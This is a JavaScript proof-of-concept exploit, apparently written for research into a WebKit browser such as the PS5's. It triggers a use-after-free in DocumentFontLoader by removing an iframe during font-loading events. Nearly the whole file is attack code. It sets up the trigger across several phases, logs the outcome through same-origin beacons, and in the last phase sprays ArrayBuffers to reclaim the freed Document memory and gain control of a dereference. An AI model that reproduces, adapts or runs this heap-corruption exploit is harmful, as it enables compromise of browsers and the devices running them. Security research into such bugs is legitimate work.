// p266 - DocumentFontLoader timer UAF
//
// Bug: fontLoadingTimerFired() calls checkLoadComplete() which fires
// a JS load event. If JS removes the iframe during that event,
// the Document is freed. When control returns to fontLoadingTimerFired
// line 105 (m_document.frame()), it dereferences freed memory.
// No RefPtr protection in WebKit-1200.
//
// Path: beginLoadingFontSoon() -> timer -> loadPendingFonts() ->
//       checkLoadComplete() -> load event -> JS removes iframe ->
//       Document freed -> m_document UAF
//
// Requires: remote font URLs (not local/data), iframe removal during
// the font loading completion event.
//
// Beacon prefix: V266-

(function() {
  function B(tag, body) {
    var url = '/beacon/V266-' + tag + '?t=' + Date.now();
    try {
      if (body) navigator.sendBeacon(url, String(body).substring(0, 900));
      else new Image().src = url;
    } catch(e) {}
  }

  B('BOOT');

  // Phase A: Basic iframe font loading test
  // Create iframe, load fonts, verify postMessage works
  function testA() {
    return new Promise(function(resolve) {
      var iframe = document.createElement('iframe');
      iframe.style.width = '200px';
      iframe.style.height = '100px';
      iframe.style.position = 'absolute';
      iframe.style.left = '-9999px';

      var gotReady = false;
      var gotLoading = false;
      var gotLoaded = false;

      function onMsg(e) {
        if (!e.data || !e.data.type) return;
        if (e.data.type === 'inner-ready') {
          gotReady = true;
          B('A-INNER-READY');
        }
        if (e.data.type === 'fonts-loading') {
          gotLoading = true;
          B('A-FONTS-LOADING');
        }
        if (e.data.type === 'fonts-loaded') {
          gotLoaded = true;
          B('A-FONTS-LOADED-' + e.data.count);
        }
        if (e.data.type === 'font0-resolved') {
          B('A-FONT0-RESOLVED');
        }
      }
      window.addEventListener('message', onMsg);

      iframe.src = 'p266-fontloader-inner.html?t=' + Date.now();
      document.body.appendChild(iframe);

      // Wait up to 5s for font loading events
      setTimeout(function() {
        window.removeEventListener('message', onMsg);
        B('A-RESULT-R' + (gotReady ? '1' : '0') +
          '-L' + (gotLoading ? '1' : '0') +
          '-D' + (gotLoaded ? '1' : '0'));
        document.body.removeChild(iframe);
        resolve(gotLoaded);
      }, 5000);
    });
  }

  // Phase B: Remove iframe during font loading event
  // This is the UAF trigger
  function testB(round) {
    return new Promise(function(resolve) {
      var iframe = document.createElement('iframe');
      iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';

      var removed = false;
      var crashExpected = false;

      function onMsg(e) {
        if (!e.data || !e.data.type) return;

        // When fonts-loaded fires, IMMEDIATELY remove the iframe
        // This should trigger the UAF: Document freed while
        // fontLoadingTimerFired is still on the stack
        if (e.data.type === 'fonts-loaded' && !removed) {
          removed = true;
          B('B' + round + '-REMOVING-IFRAME');

          // Remove iframe = destroy Document = free DocumentFontLoader
          try {
            document.body.removeChild(iframe);
          } catch(ex) {}

          // The UAF happens when fontLoadingTimerFired returns
          // from the event dispatch and accesses m_document
          crashExpected = true;
          B('B' + round + '-REMOVED');

          // If we get here, either:
          // 1. The browser didn't crash (UAF didn't trigger)
          // 2. The UAF triggered but didn't crash (exploitable!)
          // 3. The event model doesn't work this way on PS5
        }

        if (e.data.type === 'fonts-loading' && !removed) {
          // Alternative: remove during loading start instead of completion
          B('B' + round + '-LOADING-EVENT');
        }

        if (e.data.type === 'font0-resolved' && !removed) {
          B('B' + round + '-FONT0-BEFORE-REMOVE');
        }
      }
      window.addEventListener('message', onMsg);

      iframe.src = 'p266-fontloader-inner.html?t=' + Date.now() + '&r=' + round;
      document.body.appendChild(iframe);

      setTimeout(function() {
        window.removeEventListener('message', onMsg);
        if (!removed) {
          B('B' + round + '-NO-LOAD-EVENT');
          try { document.body.removeChild(iframe); } catch(ex) {}
        } else {
          B('B' + round + '-SURVIVED');
        }
        resolve(removed);
      }, 5000);
    });
  }

  // Phase C: Remove iframe during fonts-loading (start) event
  // The UAF might be easier to trigger during beginLoadingFontSoon
  function testC(round) {
    return new Promise(function(resolve) {
      var iframe = document.createElement('iframe');
      iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';

      var removed = false;

      function onMsg(e) {
        if (!e.data || !e.data.type) return;

        // Remove on loading START, not completion
        if (e.data.type === 'fonts-loading' && !removed) {
          removed = true;
          B('C' + round + '-REMOVING-ON-LOADING');
          try { document.body.removeChild(iframe); } catch(ex) {}
          B('C' + round + '-REMOVED');
        }
      }
      window.addEventListener('message', onMsg);

      iframe.src = 'p266-fontloader-inner.html?t=' + Date.now() + '&r=c' + round;
      document.body.appendChild(iframe);

      setTimeout(function() {
        window.removeEventListener('message', onMsg);
        if (!removed) {
          B('C' + round + '-NO-LOADING-EVENT');
          try { document.body.removeChild(iframe); } catch(ex) {}
        } else {
          B('C' + round + '-SURVIVED');
        }
        resolve(removed);
      }, 5000);
    });
  }

  // Phase D: Spray after iframe removal to reclaim Document memory
  function testD() {
    return new Promise(function(resolve) {
      var iframe = document.createElement('iframe');
      iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';

      var removed = false;
      var sprayed = false;
      var sprayData = [];

      function onMsg(e) {
        if (!e.data || !e.data.type) return;

        if (e.data.type === 'fonts-loaded' && !removed) {
          removed = true;
          B('D-REMOVING');
          try { document.body.removeChild(iframe); } catch(ex) {}

          // Immediately spray to reclaim Document memory
          // Document is a large object (~several KB)
          // Use ArrayBuffer backing stores of matching size
          for (var i = 0; i < 500; i++) {
            var ab = new ArrayBuffer(4096);
            var u8 = new Uint8Array(ab);
            // Fill with marker pattern
            for (var j = 0; j < 4096; j++) {
              u8[j] = 0xC0 + (i & 0x3F);
            }
            sprayData.push(ab);
          }
          sprayed = true;
          B('D-SPRAYED-' + sprayData.length);

          // If fontLoadingTimerFired accesses m_document now,
          // it reads our spray data as a Document*
          // frame() dereference on spray data = controlled crash
        }
      }
      window.addEventListener('message', onMsg);

      iframe.src = 'p266-fontloader-inner.html?t=' + Date.now() + '&r=d';
      document.body.appendChild(iframe);

      setTimeout(function() {
        window.removeEventListener('message', onMsg);
        if (!removed) {
          B('D-NO-EVENT');
          try { document.body.removeChild(iframe); } catch(ex) {}
        } else {
          B('D-SURVIVED-SPRAY-' + (sprayed ? 'YES' : 'NO'));
        }
        resolve({removed: removed, sprayed: sprayed});
      }, 6000);
    });
  }

  // Run phases sequentially
  testA().then(function(fontsWork) {
    B('PHASE-A-FONTS-' + (fontsWork ? 'WORK' : 'FAIL'));
    if (!fontsWork) {
      B('FONTS-DONT-LOAD-IN-IFRAME');
      B('DONE');
      return;
    }
    return testB(0);
  }).then(function(removed) {
    if (removed === undefined) return;
    return testB(1);
  }).then(function() {
    return testC(0);
  }).then(function() {
    return testC(1);
  }).then(function() {
    return testD();
  }).then(function(res) {
    if (res) {
      B('D-FINAL-' + (res.removed ? 'REMOVED' : 'NOT') + '-' + (res.sprayed ? 'SPRAYED' : 'NOT'));
    }
    B('DONE');
  }).catch(function(e) {
    B('ERROR-' + (e.message || '').substring(0, 40));
    B('DONE');
  });
})();
